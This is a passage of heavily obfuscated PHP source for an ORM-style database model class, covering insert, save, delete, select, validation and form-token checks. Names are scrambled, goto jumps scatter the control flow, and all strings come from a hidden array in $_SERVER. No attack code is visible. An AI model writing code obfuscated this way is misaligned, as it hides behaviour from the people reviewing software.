$B›òÓö°¥ù = $this->db->insertAll($FïÉµÙ…ß, $cÄ›„¹³¾‡, $e¸¶¨ĞóÅÅ); } else { $this->startTrans(); foreach ($FïÉµÙ…ß as $e°Œõ†©¨ => $F‚„Òæ‹) { $B›òÓö°¥ù = $this->db->insert($F‚„Òæ‹, $cÄ›„¹³¾‡, $e¸¶¨ĞóÅÅ); } $this->commit(); } if (!1 !== $B›òÓö°¥ù) { $A¤Ìƒ†—¹‡ = $this->getLastInsID(); if ($A¤Ìƒ†—¹‡) { return $A¤Ìƒ†—¹‡; } } goto bë¡áŸ‡ƒÅ; c‡éµ´Ã…å: $EØëä«™íà =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($FïÉµÙ…ß)) { $this->error = think_lang($EØëä«™íà[259]); return !1; } $cÄ›„¹³¾‡ = $this->_parseOptions($cÄ›„¹³¾‡); goto aéÌ•Á§ˆ; E™ŒİÈáä„: } public function selectAdd($eçöî¡ƒÉ = '', $c‘±ö”¤˜Ú = '', $a±Š™¥­Œ = array()) { $eÃª¶Ó†Š =& $_SERVER[ã®Â„Éæ¹¤]; $a±Š™¥­Œ = $this->_parseOptions($a±Š™¥­Œ); if (!1 === ($F¹åó²—ë = $this->db->selectInsert($eçöî¡ƒÉ ? $eçöî¡ƒÉ : $a±Š™¥­Œ[$eÃª¶Ó†Š[261]], $c‘±ö”¤˜Ú ? $c‘±ö”¤˜Ú : $this->getTableName(), $a±Š™¥­Œ))) { $this->error = think_lang($eÃª¶Ó†Š[262]); return !1; } else { return $F¹åó²—ë; } } public function save($D›Öœ¯Ç± = '', $d¼«„‰³–ë = array()) { goto dššÅ‹¥; Dàò˜‚ÏÍÇ: $d¼«„‰³–ë = $this->_parseOptions($d¼«„‰³–ë); $f‡¾×ª‡‰å = $this->getPk(); if (!isset($d¼«„‰³–ë[$a‘µ«öõ¼—[263]])) { if (isset($D›Öœ¯Ç±[$f‡¾×ª‡‰å])) { $e¥ÍŒ¥­Å[$f‡¾×ª‡‰å] = $D›Öœ¯Ç±[$f‡¾×ª‡‰å]; $d¼«„‰³–ë[$a‘µ«öõ¼—[263]] = $e¥ÍŒ¥­Å; unset($D›Öœ¯Ç±[$f‡¾×ª‡‰å]); } else { $this->error = think_lang($a‘µ«öõ¼—[262]); return !1; } } goto c£Şìë®—; c£Şìë®—: if (is_array($d¼«„‰³–ë[$a‘µ«öõ¼—[263]]) && isset($d¼«„‰³–ë[$a‘µ«öõ¼—[263]][$f‡¾×ª‡‰å])) { $Eª†¦ğÒ¥İ = $d¼«„‰³–ë[$a‘µ«öõ¼—[263]][$f‡¾×ª‡‰å]; } if (!1 === $this->_beforeUpdate($D›Öœ¯Ç±, $d¼«„‰³–ë)) { return !1; } $b ®©ÏÎĞì = $this->db->update($D›Öœ¯Ç±, $d¼«„‰³–ë); goto cÇ©ºÓï¦ì; cÇ©ºÓï¦ì: if (!1 !== $b ®©ÏÎĞì) { if (isset($Eª†¦ğÒ¥İ)) { $D›Öœ¯Ç±[$f‡¾×ª‡‰å] = $Eª†¦ğÒ¥İ; } $this->_afterUpdate($D›Öœ¯Ç±, $d¼«„‰³–ë); } return $b ®©ÏÎĞì; goto dÔ¥“Æ¢õÛ; dššÅ‹¥: $a‘µ«öõ¼— =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($D›Öœ¯Ç±)) { if (!empty($this->data)) { $D›Öœ¯Ç± = $this->data; $this->data = array(); } else { $this->error = think_lang($a‘µ«öõ¼—[259]); return !1; } } $D›Öœ¯Ç± = $this->_facade($D›Öœ¯Ç±); goto Dàò˜‚ÏÍÇ; dÔ¥“Æ¢õÛ: } protected function _beforeUpdate(&$EÜĞí‡Š¨ì, $dõáÍ°ßÜ) { } protected function _afterUpdate($eÎ”¦ÖØôÅ, $C—™¸ÅÙóœ) { } public function delete($Eí¹°Š‡ÉŞ = array()) { goto cŸ«‹²° ; a…¢ù¬…÷†: $D½äˆ†¥‚æ = $this->db->delete($Eí¹°Š‡ÉŞ); if (!1 !== $D½äˆ†¥‚æ) { $c˜Ãà«Ÿ¡¦ = array(); if (isset($b¾–ÉÁÆ²³)) { $c˜Ãà«Ÿ¡¦[$EáÌÁÒ­†›] = $b¾–ÉÁÆ²³; } $this->_after_delete($c˜Ãà«Ÿ¡¦, $Eí¹°Š‡ÉŞ); } return $D½äˆ†¥‚æ; goto A¼µ™ ±•§; cŸ«‹²° : $B„ÍÜÙÃ… =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($Eí¹°Š‡ÉŞ) && empty($this->options[$B„ÍÜÙÃ…[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $EáÌÁÒ­†› = $this->getPk(); goto Fœ•ÍÈÎ¼Ï; Fœ•ÍÈÎ¼Ï: if (is_numeric($Eí¹°Š‡ÉŞ) || is_string($Eí¹°Š‡ÉŞ)) { if (strpos($Eí¹°Š‡ÉŞ, $B„ÍÜÙÃ…[47])) { $e³…İ’‚¯[$EáÌÁÒ­†›] = array($B„ÍÜÙÃ…[264], $Eí¹°Š‡ÉŞ); } else { $e³…İ’‚¯[$EáÌÁÒ­†›] = $Eí¹°Š‡ÉŞ; } $this->options[$B„ÍÜÙÃ…[263]] = $e³…İ’‚¯; } $Eí¹°Š‡ÉŞ = $this->_parseOptions(); if (is_array($Eí¹°Š‡ÉŞ[$B„ÍÜÙÃ…[263]]) && isset($Eí¹°Š‡ÉŞ[$B„ÍÜÙÃ…[263]][$EáÌÁÒ­†›])) { $b¾–ÉÁÆ²³ = $Eí¹°Š‡ÉŞ[$B„ÍÜÙÃ…[263]][$EáÌÁÒ­†›]; } goto a…¢ù¬…÷†; A¼µ™ ±•§: } protected function _after_delete($F÷°ÙØ…©, $FĞÇš¹äŠŠ) { } public function select($D±Š´åºº’ = array()) { goto Fˆâ¶ğİ‚‰; d•ÓÜÔ•‚•: $eˆŠóçŒè = $this->db->select($D±Š´åºº’); if (!1 === $eˆŠóçŒè) { return !1; } if (empty($eˆŠóçŒè)) { return null; } goto E¨Šè†è—; E¨Šè†è—: $this->_afterSelect($eˆŠóçŒè, $D±Š´åºº’); return $eˆŠóçŒè; goto aº”êí¡­; Fˆâ¶ğİ‚‰: $bñØÖÕ ôš =& $_SERVER[ã®Â„Éæ¹¤]; if (is_string($D±Š´åºº’) || is_numeric($D±Š´åºº’)) { $aÖ”¢ôˆ› = $this->getPk(); if (strpos($D±Š´åºº’, $bñØÖÕ ôš[47])) { $dÊåÚ¤¿áÔ[$aÖ”¢ôˆ›] = array($bñØÖÕ ôš[264], $D±Š´åºº’); } else { $dÊåÚ¤¿áÔ[$aÖ”¢ôˆ›] = $D±Š´åºº’; } $this->options[$bñØÖÕ ôš[263]] = $dÊåÚ¤¿áÔ; } elseif (!1 === $D±Š´åºº’) { $D±Š´åºº’ = $this->_parseOptions(); return $bñØÖÕ ôš[265] . $this->db->buildSelectSql($D±Š´åºº’) . $bñØÖÕ ôš[266]; } $D±Š´åºº’ = $this->_parseOptions(); goto d•ÓÜÔ•‚•; aº”êí¡­: } protected function _afterSelect(&$d†ô÷’÷, $Dˆ²ìäë) { } public function buildSql($C“ê¤¸¼ë = array()) { $aòˆÆ¤¬  =& $_SERVER[ã®Â„Éæ¹¤]; $C“ê¤¸¼ë = $this->_parseOptions($C“ê¤¸¼ë); return $aòˆÆ¤¬ [265] . $this->db->buildSelectSql($C“ê¤¸¼ë) . $aòˆÆ¤¬ [266]; } public function optionsValue($b£ÂİãÙ¿Æ = null) { if (is_null($b£ÂİãÙ¿Æ)) { return $this->options; } elseif (is_array($b£ÂİãÙ¿Æ)) { $this->options = array_merge($this->options, $b£ÂİãÙ¿Æ); } } protected function _parseOptions($a¬š÷á­ŒÚ = array()) { goto F¸½È°ó ¡; AßŠ“§’„‡: if (!isset($a¬š÷á­ŒÚ[$f­›„îêÛÏ[267]])) { $a¬š÷á­ŒÚ[$f­›„îêÛÏ[267]] = $this->getTableName(); $BˆßËù¾ = $this->fields; } else { $BˆßËù¾ = $this->getDbFields(); } if (!empty($a¬š÷á­ŒÚ[$f­›„îêÛÏ[268]])) { $a¬š÷á­ŒÚ[$f­›„îêÛÏ[267]] .= $f­›„îêÛÏ[50] . $a¬š÷á­ŒÚ[$f­›„îêÛÏ[268]]; } $a¬š÷á­ŒÚ[$f­›„îêÛÏ[269]] = $this->name; goto bÀ°ãò«âß; F¸½È°ó ¡: $f­›„îêÛÏ =& $_SERVER[ã®Â„Éæ¹¤]; if (is_array($a¬š÷á­ŒÚ)) { $a¬š÷á­ŒÚ = array_merge($this->options, $a¬š÷á­ŒÚ); } $this->options = array(); goto AßŠ“§’„‡; bÀ°ãò«âß: if (isset($a¬š÷á­ŒÚ[$f­›„îêÛÏ[263]]) && is_array($a¬š÷á­ŒÚ[$f­›„îêÛÏ[263]]) && !empty($BˆßËù¾) && !isset($a¬š÷á­ŒÚ[$f­›„îêÛÏ[270]]) && !isset($a¬š÷á­ŒÚ[$f­›„îêÛÏ[267]])) { foreach ($a¬š÷á­ŒÚ[$f­›„îêÛÏ[263]] as $FÖˆ®å‘õÖ => $côŞùñäïŒ) { $FÖˆ®å‘õÖ = trim($FÖˆ®å‘õÖ); if (in_array($FÖˆ®å‘õÖ, $BˆßËù¾, !0)) { if (is_scalar($côŞùñäïŒ)) { $this->_parseType($a¬š÷á­ŒÚ[$f­›„îêÛÏ[263]], $FÖˆ®å‘õÖ); } } elseif (!is_numeric($FÖˆ®å‘õÖ) && $f­›„îêÛÏ[70] != substr($FÖˆ®å‘õÖ, 0, 1) && !1 === strpos($FÖˆ®å‘õÖ, $f­›„îêÛÏ[91]) && !1 === strpos($FÖˆ®å‘õÖ, $f­›„îêÛÏ[248]) && !1 === strpos($FÖˆ®å‘õÖ, $f­›„îêÛÏ[271]) && !1 === strpos($FÖˆ®å‘õÖ, $f­›„îêÛÏ[272])) { unset($a¬š÷á­ŒÚ[$f­›„îêÛÏ[263]][$FÖˆ®å‘õÖ]); } } } $this->_options_filter($a¬š÷á­ŒÚ); return $a¬š÷á­ŒÚ; goto D¶òãëœ¡³; D¶òãëœ¡³: } protected function _options_filter(&$Fáä…›Ôì ) { } protected function _parseType(&$Aµï£º¤—, $Aåæ³°Òƒ) { $dÕº½õš‰ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($this->options[$dÕº½õš‰[273]][$dÕº½õš‰[4] . $Aåæ³°Òƒ])) { $E”ô‰«¤¹ = strtolower($this->fields[$dÕº½õš‰[240]][$Aåæ³°Òƒ]); if (!1 !== strpos($E”ô‰«¤¹, $dÕº½õš‰[274])) { } elseif (!1 === strpos($E”ô‰«¤¹, $dÕº½õš‰[275]) && !1 !== strpos($E”ô‰«¤¹, $dÕº½õš‰[276])) { $Aµï£º¤—[$Aåæ³°Òƒ] = intval($Aµï£º¤—[$Aåæ³°Òƒ]); } elseif (!1 !== strpos($E”ô‰«¤¹, $dÕº½õš‰[277]) || !1 !== strpos($E”ô‰«¤¹, $dÕº½õš‰[278])) { $Aµï£º¤—[$Aåæ³°Òƒ] = floatval($Aµï£º¤—[$Aåæ³°Òƒ]); } elseif (!1 !== strpos($E”ô‰«¤¹, $dÕº½õš‰[279])) { $Aµï£º¤—[$Aåæ³°Òƒ] = (bool) $Aµï£º¤—[$Aåæ³°Òƒ]; } } } public function find($d—±èç¯Áê = array()) { goto cã–‘¢™‘›; f¡ĞÙÚ˜Å‰: if (empty($Aµœ¤Á››)) { return null; } $this->data = $Aµœ¤Á››[0]; $this->_afterFind($this->data, $d—±èç¯Áê); goto C–ã”•Ÿ›; C–ã”•Ÿ›: if (!empty($this->options[$D…ç˜ÌÅŞˆ[281]])) { return $this->returnResult($this->data, $this->options[$D…ç˜ÌÅŞˆ[281]]); } return $this->data; goto BÇñŸíºãË; CîÄëæ¿¹Ç: $d—±èç¯Áê = $this->_parseOptions(); $Aµœ¤Á›› = $this->db->select($d—±èç¯Áê); if (!1 === $Aµœ¤Á››) { return !1; } goto f¡ĞÙÚ˜Å‰; cã–‘¢™‘›: $D…ç˜ÌÅŞˆ =& $_SERVER[ã®Â„Éæ¹¤]; if (is_numeric($d—±èç¯Áê) || is_string($d—±èç¯Áê)) { $D¾‡‰ÛĞ‘²[$this->getPk()] = intval($d—±èç¯Áê); $this->options[$D…ç˜ÌÅŞˆ[263]] = $D¾‡‰ÛĞ‘²; } $this->options[$D…ç˜ÌÅŞˆ[280]] = 1; goto CîÄëæ¿¹Ç; BÇñŸíºãË: } protected function _afterFind(&$fÛÄÊ‡˜İÛ, $cÚÍ§ø›‡‰) { } protected function returnResult($CÌ¸Ğ—‚Ñç, $e·ƒÅ§¿±‹ = '') { $CÜäò‹ò™ï =& $_SERVER[ã®Â„Éæ¹¤]; if ($e·ƒÅ§¿±‹) { if (is_callable($e·ƒÅ§¿±‹)) { return call_user_func($e·ƒÅ§¿±‹, $CÌ¸Ğ—‚Ñç); } switch (strtolower($e·ƒÅ§¿±‹)) { case $CÜäò‹ò™ï[282]: return json_encode($CÌ¸Ğ—‚Ñç); case $CÜäò‹ò™ï[283]: return xml_encode($CÌ¸Ğ—‚Ñç); } } return $CÌ¸Ğ—‚Ñç; } public function parseFieldsMap($C„‚«ø‰², $E¬‘ŒĞŸŞº = 1) { if (!empty($this->_map)) { foreach ($this->_map as $f¶„¶‰ÓšÑ => $A˜ï¡¸Ÿ…›) { if ($E¬‘ŒĞŸŞº == 1) { if (isset($C„‚«ø‰²[$A˜ï¡¸Ÿ…›])) { $C„‚«ø‰²[$f¶„¶‰ÓšÑ] = $C„‚«ø‰²[$A˜ï¡¸Ÿ…›]; unset($C„‚«ø‰²[$A˜ï¡¸Ÿ…›]); } } else { if (isset($C„‚«ø‰²[$f¶„¶‰ÓšÑ])) { $C„‚«ø‰²[$A˜ï¡¸Ÿ…›] = $C„‚«ø‰²[$f¶„¶‰ÓšÑ]; unset($C„‚«ø‰²[$f¶„¶‰ÓšÑ]); } } } } return $C„‚«ø‰²; } public function setField($E‹ßÑŒÂ¤‚, $A¦Œˆ‹ìÀ = '') { if (is_array($E‹ßÑŒÂ¤‚)) { $Dãï‡Ïóßµ = $E‹ßÑŒÂ¤‚; } else { $Dãï‡Ïóßµ[$E‹ßÑŒÂ¤‚] = $A¦Œˆ‹ìÀ; } return $this->save($Dãï‡Ïóßµ); } public function setAdd($fŠà–¯ÚËÆ, $d™ÏšßÇà¶ = 1) { $BŞ˜‡§ğ‡© =& $_SERVER[ã®Â„Éæ¹¤]; $eÁá†¸äî¬ = $fŠà–¯ÚËÆ . $BŞ˜‡§ğ‡©[284] . $d™ÏšßÇà¶; if ($d™ÏšßÇà¶ < 0) { $eÁá†¸äî¬ = $fŠà–¯ÚËÆ . $d™ÏšßÇà¶; } return $this->setField($fŠà–¯ÚËÆ, array($BŞ˜‡§ğ‡©[285], $eÁá†¸äî¬)); } public function getField($c„ç­®Š–´, $d‰“·»î· = null) { $fœ¼¦íÀŒÏ =& $_SERVER[ã®Â„Éæ¹¤]; $BÉ‚‘ˆ³[$fœ¼¦íÀŒÏ[261]] = $c„ç­®Š–´; $BÉ‚‘ˆ³ = $this->_parseOptions($BÉ‚‘ˆ³); $c„ç­®Š–´ = trim($c„ç­®Š–´); if (strpos($c„ç­®Š–´, $fœ¼¦íÀŒÏ[47])) { if (!isset($BÉ‚‘ˆ³[$fœ¼¦íÀŒÏ[280]])) { $BÉ‚‘ˆ³[$fœ¼¦íÀŒÏ[280]] = is_numeric($d‰“·»î·) ? $d‰“·»î· : $fœ¼¦íÀŒÏ[33]; } $EéÒñç¹ = $this->db->select($BÉ‚‘ˆ³); if (!empty($EéÒñç¹)) { goto cì‘÷¤‘Œ; dšòÁ°¾²: $eÚÏ§¾°Òß = array_shift($c„ç­®Š–´); $d¨¢È¿ËäĞ = array(); $FÆºÖÑò¿¯ = count($C³ö¬šââĞ); goto d¬ÇæïŠ; d¬ÇæïŠ: foreach ($EéÒñç¹ as $C¢ƒâ¸Œ) { $B±ñÃôÃŞ¨ = $C¢ƒâ¸Œ[$c’º÷ä®ªœ]; if (2 == $FÆºÖÑò¿¯) { $d¨¢È¿ËäĞ[$B±ñÃôÃŞ¨] = $C¢ƒâ¸Œ[$eÚÏ§¾°Òß]; } else { $d¨¢È¿ËäĞ[$B±ñÃôÃŞ¨] = is_string($d‰“·»î·) ? implode($d‰“·»î·, $C¢ƒâ¸Œ) : $C¢ƒâ¸Œ; } } return $d¨¢È¿ËäĞ; goto eÛ”ö‡¢¹ë; cì‘÷¤‘Œ: $C³ö¬šââĞ = explode($fœ¼¦íÀŒÏ[47], $c„ç­®Š–´); $c„ç­®Š–´ = array_keys($EéÒñç¹[0]); $c’º÷ä®ªœ = array_shift($c„ç­®Š–´); goto dšòÁ°¾²; eÛ”ö‡¢¹ë: } } else { if (!0 !== $d‰“·»î·) { $BÉ‚‘ˆ³[$fœ¼¦íÀŒÏ[280]] = is_numeric($d‰“·»î·) ? $d‰“·»î· : 1; } if ($d‰“·»î· === $fœ¼¦íÀŒÏ[243]) { unset($BÉ‚‘ˆ³[$fœ¼¦íÀŒÏ[280]]); } $C¢ƒâ¸Œ = $this->db->select($BÉ‚‘ˆ³); if (!empty($C¢ƒâ¸Œ)) { if ($d‰“·»î· === $fœ¼¦íÀŒÏ[243]) { return reset($C¢ƒâ¸Œ[0]); } if (!0 !== $d‰“·»î· && 1 == $BÉ‚‘ˆ³[$fœ¼¦íÀŒÏ[280]]) { return reset($C¢ƒâ¸Œ[0]); } foreach ($C¢ƒâ¸Œ as $bÚ§ö›»ƒ) { $BÀÈµù£[] = $bÚ§ö›»ƒ[$c„ç­®Š–´]; } return $BÀÈµù£; } } return null; } public function create($EäñäËŸöÍ = '', $e÷ß‡Ş±± = '') { goto F¢ÖÒÆŒÙ; Bà–©’ÖŒè: return $EäñäËŸöÍ; goto fØéÛñµŒ; cŞ¬òˆ¬ß§: if ($this->autoCheckFields) { $eŒ‘ àÇùœ = $this->getDbFields(); foreach ($EäñäËŸöÍ as $e‚ğé½Ï => $eîÙŒ”êà¢) { if (!in_array($e‚ğé½Ï, $eŒ‘ àÇùœ)) { unset($EäñäËŸöÍ[$e‚ğé½Ï]); } elseif (MAGIC_QUOTES_GPC && is_string($eîÙŒ”êà¢)) { $EäñäËŸöÍ[$e‚ğé½Ï] = stripslashes($eîÙŒ”êà¢); } } } $this->autoOperation($EäñäËŸöÍ, $e÷ß‡Ş±±); $this->data = $EäñäËŸöÍ; goto Bà–©’ÖŒè; AäáĞ‰´â˜: if (isset($eŒ‘ àÇùœ)) { if (is_string($eŒ‘ àÇùœ)) { $eŒ‘ àÇùœ = explode($cæôĞ¿­ê¯[47], $eŒ‘ àÇùœ); } if (think_config($cæôĞ¿­ê¯[286])) { $eŒ‘ àÇùœ[] = think_config($cæôĞ¿­ê¯[287]); } foreach ($EäñäËŸöÍ as $e‚ğé½Ï => $eîÙŒ”êà¢) { if (!in_array($e‚ğé½Ï, $eŒ‘ àÇùœ)) { unset($EäñäËŸöÍ[$e‚ğé½Ï]); } } } if (!$this->autoValidation($EäñäËŸöÍ, $e÷ß‡Ş±±)) { return !1; } if (!$this->autoCheckToken($EäñäËŸöÍ)) { $this->error = think_lang($cæôĞ¿­ê¯[288]); return !1; } goto cŞ¬òˆ¬ß§; eŠÖ“È˜±: $EäñäËŸöÍ = $this->parseFieldsMap($EäñäËŸöÍ, 0); $e÷ß‡Ş±± = $e÷ß‡Ş±± ? $e÷ß‡Ş±± : (!empty($EäñäËŸöÍ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$cæôĞ¿­ê¯[261]])) { $eŒ‘ àÇùœ = $this->options[$cæôĞ¿­ê¯[261]]; unset($this->options[$cæôĞ¿­ê¯[261]]); } elseif ($e÷ß‡Ş±± == THINK_MODEL_INSERT && isset($this->insertFields)) { $eŒ‘ àÇùœ = $this->insertFields; } elseif ($e÷ß‡Ş±± == THINK_MODEL_UPDATE && isset($this->updateFields)) { $eŒ‘ àÇùœ = $this->updateFields; } goto AäáĞ‰´â˜; F¢ÖÒÆŒÙ: $cæôĞ¿­ê¯ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($EäñäËŸöÍ)) { $EäñäËŸöÍ = $_POST; } elseif (is_object($EäñäËŸöÍ)) { $EäñäËŸöÍ = get_object_vars($EäñäËŸöÍ); } if (empty($EäñäËŸöÍ) || !is_array($EäñäËŸöÍ)) { $this->error = think_lang($cæôĞ¿­ê¯[259]); return !1; } goto eŠÖ“È˜±; fØéÛñµŒ: } public function autoCheckToken($aã¦»™¹‰) { $FªìŠÊ…ä =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($this->options[$FªìŠÊ…ä[289]]) && !$this->options[$FªìŠÊ…ä[289]]) { return !0; } if (think_config($FªìŠÊ…ä[286])) { $aì™¬½šî” = think_config($FªìŠÊ…ä[287]); if (!isset($aã¦»™¹‰[$aì™¬½šî”]) || Session::get($aì™¬½šî”)) { return !1; } list($dŒè™’İÀ, $A§…ÅõÒ) = explode($FªìŠÊ…ä[70], $aã¦»™¹‰[$aì™¬½šî”]); if ($A§…ÅõÒ && Session::get($aì™¬½šî” . $FªìŠÊ…ä[91] . $dŒè™’İÀ) === $A§…ÅõÒ) { Session::remove($aì™¬½šî” . $FªìŠÊ…ä[91] . $dŒè™’İÀ); return !0; } if (think_config($FªìŠÊ…ä[290])) { Session::remove($aì™¬½šî” . $FªìŠÊ…ä[91] . $dŒè™’İÀ); } return !1; } return !0; } public function regex($D›Ü‡ç­, $Eß›ò­ìî‡) { $BÖ‚Ù¿ŸŞ =& $_SERVER[ã®Â„Éæ¹¤]; $C½¼Šã”Ò‚ = array($BÖ‚Ù¿ŸŞ[291] => $BÖ‚Ù¿ŸŞ[292], $BÖ‚Ù¿ŸŞ[293] => $BÖ‚Ù¿ŸŞ[294], $BÖ‚Ù¿ŸŞ[295] => $BÖ‚Ù¿ŸŞ[296], $BÖ‚Ù¿ŸŞ[297] => $BÖ‚Ù¿ŸŞ[298], $BÖ‚Ù¿ŸŞ[299] => $BÖ‚Ù¿ŸŞ[300], $BÖ‚Ù¿ŸŞ[301] => $BÖ‚Ù¿ŸŞ[302], $BÖ‚Ù¿ŸŞ[303] => $BÖ‚Ù¿ŸŞ[304], $BÖ‚Ù¿ŸŞ[278] => $BÖ‚Ù¿ŸŞ[305], $BÖ‚Ù¿ŸŞ[306] => $BÖ‚Ù¿ŸŞ[307]); if (isset($C½¼Šã”Ò‚[strtolower($Eß›ò­ìî‡)])) { $Eß›ò­ìî‡ = $C½¼Šã”Ò‚[strtolower($Eß›ò­ìî‡)]; } return preg_match($Eß›ò­ìî‡, $D›Ü‡ç­) === 1; } private function autoOperation(&$fá’ø¾¥, $BÀğ×‹êæ) { $bØÔŸÙ²Ñ =& $_SERVER[ã®Â„Éæ¹¤]; if (!empty($this->options[$bØÔŸÙ²Ñ[308]])) { $EŒˆ´¸…¤Ã = $this->options[$bØÔŸÙ²Ñ[308]]; unset($this->options[$bØÔŸÙ²Ñ[308]]); } elseif (!empty($this->_auto)) { $EŒˆ´¸…¤Ã = $this->_auto; } if (isset($EŒˆ´¸…¤Ã)) { foreach ($EŒˆ´¸…¤Ã as $EìÑÕ•ïº¿) { if (empty($EìÑÕ•ïº¿[2])) { $EìÑÕ•ïº¿[2] = THINK_MODEL_INSERT; } if ($BÀğ×‹êæ == $EìÑÕ•ïº¿[2] || $EìÑÕ•ïº¿[2] == THINK_MODEL_BOTH) { switch (trim($EìÑÕ•ïº¿[3])) { case $bØÔŸÙ²Ñ[309]: case $bØÔŸÙ²Ñ[310]: $A”çó¦ Ó = isset($EìÑÕ•ïº¿[4]) ? (array) $EìÑÕ•ïº¿[4] : array(); if (isset($fá’ø¾¥[$EìÑÕ•ïº¿[0]])) { array_unshift($A”çó¦ Ó, $fá’ø¾¥[$EìÑÕ•ïº¿[0]]); } if ($bØÔŸÙ²Ñ[309] == $EìÑÕ•ïº¿[3]) { $fá’ø¾¥[$EìÑÕ•ïº¿[0]] = call_user_func_array($EìÑÕ•ïº¿[1], $A”çó¦ Ó); } else { $fá’ø¾¥[$EìÑÕ•ïº¿[0]] = call_user_func_array(array(&$this, $EìÑÕ•ïº¿[1]), $A”çó¦ Ó); } break; case $bØÔŸÙ²Ñ[261]: $fá’ø¾¥[$EìÑÕ•ïº¿[0]] = $fá’ø¾¥[$EìÑÕ•ïº¿[1]]; break; case $bØÔŸÙ²Ñ[311]: if ($bØÔŸÙ²Ñ[33] === $fá’ø¾¥[$EìÑÕ•ïº¿[0]]) { unset($fá’ø¾¥[$EìÑÕ•ïº¿[0]]); } break; case $bØÔŸÙ²Ñ[312]: default: $fá’ø¾¥[$EìÑÕ•ïº¿[0]] = $EìÑÕ•ïº¿[1]; } if (!1 === $fá’ø¾¥[$EìÑÕ•ïº¿[0]]) { unset($fá’ø¾¥[$EìÑÕ•ïº¿[0]]); } } } } return $fá’ø¾¥; } protected function autoValidation($cëÔ¾ñ›³“, $b¦™¶ÕÊŞâ) { $CÕÜÙ›Óê† =& $_SERVER[ã®Â„Éæ¹¤]; if (!empty($this->options[$CÕÜÙ›Óê†[313]])) { $fŠĞ‹Óˆ = $this->options[$CÕÜÙ›Óê†[313]]; unset($this->options[$CÕÜÙ›Óê†[313]]); } elseif (!empty($this->_validate)) { $fŠĞ‹Óˆ = $this->_validate; } if (isset($fŠĞ‹Óˆ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($fŠĞ‹Óˆ as $Dâ¯ÄÏÅó  => $Eó®¼¶‹) { if (empty($Eó®¼¶‹[5]) || $Eó®¼¶‹[5] == THINK_MODEL_BOTH || $Eó®¼¶‹[5] == $b¦™¶ÕÊŞâ) { if (0 == strpos($Eó®¼¶‹[2], $CÕÜÙ›Óê†[314]) && strpos($Eó®¼¶‹[2], $CÕÜÙ›Óê†[315])) { $Eó®¼¶‹[2] = think_lang(substr($Eó®¼¶‹[2], 2, -1)); } $Eó®¼¶‹[3] = isset($Eó®¼¶‹[3]) ? $Eó®¼¶‹[3] : THINK_EXISTS_VALIDATE; $Eó®¼¶‹[4] = isset($Eó®¼¶‹[4]) ? $Eó®¼¶‹[4] : $CÕÜÙ›Óê†[316]; switch ($Eó®¼¶‹[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($cëÔ¾ñ›³“, $Eó®¼¶‹)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($CÕÜÙ›Óê†[33] != trim($cëÔ¾ñ›³“[$Eó®¼¶‹[0]])) { if (!1 === $this->_validationField($cëÔ¾ñ›³“, $Eó®¼¶‹)) { return !1; } } break; default: if (isset($cëÔ¾ñ›³“[$Eó®¼¶‹[0]])) { if (!1 === $this->_validationField($cëÔ¾ñ›³“, $Eó®¼¶‹)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($c†×‹¤ïôŠ, $BÏ²ù…§‹) { if (!1 === $this->_validationFieldItem($c†×‹¤ïôŠ, $BÏ²ù…§‹)) { if ($this->patchValidate) { $this->error[$BÏ²ù…§‹[0]] = $BÏ²ù…§‹[2]; } else { $this->error = $BÏ²ù…§‹[2]; return !1; } } return; } protected function _validationFieldItem($B×¸Ï¯ñí·, $fÃîÜÏÀàÑ) { $dˆ½Ÿ¢êÓ =& $_SERVER[ã®Â„Éæ¹¤]; switch (strtolower(trim($fÃîÜÏÀàÑ[4]))) { case $dˆ½Ÿ¢êÓ[309]: case $dˆ½Ÿ¢êÓ[310]: $C¼Îƒ´Îä = isset($fÃîÜÏÀàÑ[6]) ? (array) $fÃîÜÏÀàÑ[6] : array(); if (is_string($fÃîÜÏÀàÑ[0]) && strpos($fÃîÜÏÀàÑ[0], $dˆ½Ÿ¢êÓ[47])) { $fÃîÜÏÀàÑ[0] = explode($dˆ½Ÿ¢êÓ[47], $fÃîÜÏÀàÑ[0]); } if (is_array($fÃîÜÏÀàÑ[0])) { foreach ($fÃîÜÏÀàÑ[0] as $A‰«¸êËá¾) { $a‚ëëóŞÑğ[$A‰«¸êËá¾] = $B×¸Ï¯ñí·[$A‰«¸êËá¾]; } array_unshift($C¼Îƒ´Îä, $a‚ëëóŞÑğ); } else { array_unshift($C¼Îƒ´Îä, $B×¸Ï¯ñí·[$fÃîÜÏÀàÑ[0]]); } if ($dˆ½Ÿ¢êÓ[309] == $fÃîÜÏÀàÑ[4]) { return call_user_func_array($fÃîÜÏÀàÑ[1], $C¼Îƒ´Îä); } else { return call_user_func_array(array(&$this, $fÃîÜÏÀàÑ[1]), $C¼Îƒ´Îä); } case $dˆ½Ÿ¢êÓ[317]: return $B×¸Ï¯ñí·[$fÃîÜÏÀàÑ[0]] == $B×¸Ï¯ñí·[$fÃîÜÏÀàÑ[1]]; case $dˆ½Ÿ¢êÓ[318]: if (is_string($fÃîÜÏÀàÑ[0]) && strpos($fÃîÜÏÀàÑ[0], $dˆ½Ÿ¢êÓ[47])) { $fÃîÜÏÀàÑ[0] = explode($dˆ½Ÿ¢êÓ[47], $fÃîÜÏÀàÑ[0]); } $EæùÍŞ–²Ö = array(); if (is_array($fÃîÜÏÀàÑ[0])) { foreach ($fÃîÜÏÀàÑ[0] as $A‰«¸êËá¾) { $EæùÍŞ–²Ö[$A‰«¸êËá¾] = $B×¸Ï¯ñí·[$A‰«¸êËá¾]; } } else { $EæùÍŞ–²Ö[$fÃîÜÏÀàÑ[0]] = $B×¸Ï¯ñí·[$fÃîÜÏÀàÑ[0]]; } if (!empty($B×¸Ï¯ñí·[$this->getPk()])) { $EæùÍŞ–²Ö[$this->getPk()] = array($dˆ½Ÿ¢êÓ[319], $B×¸Ï¯ñí·[$this->getPk()]); } if 